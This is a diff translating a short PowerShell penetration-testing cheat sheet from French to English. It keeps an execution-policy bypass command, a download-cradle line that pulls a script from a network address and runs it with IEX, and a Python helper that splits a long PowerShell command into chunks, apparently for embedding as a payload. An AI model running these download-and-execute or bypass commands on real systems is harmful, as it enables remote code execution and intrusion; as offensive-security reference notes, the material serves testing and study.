@@ -1,8 +1,8 @@
 # PowerShell - PSH
 
-PowerShell est un langage de programmation orienté objet exécuté à partir du Dynamic Language Runtime (DLR) dans `.NET`
+PowerShell is an object-oriented programming language executed from the Dynamic Language Runtime (DLR) in `.NET`
 
-Contournement des arguments
+Bypass arguments
 
 ```sh
 powershell -ex bypass -File exploit.ps1
@@ -14,7 +14,7 @@ powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.1
 ```
 
 ---
-Fichier `split.py`
+File `split.py`
 
 ```python
 str = "powershell ..."
@@ -24,4 +24,3 @@ for i in range(0, len(str), 50):
 
 # python split.py | xclip -selection clipboard
 ```
-
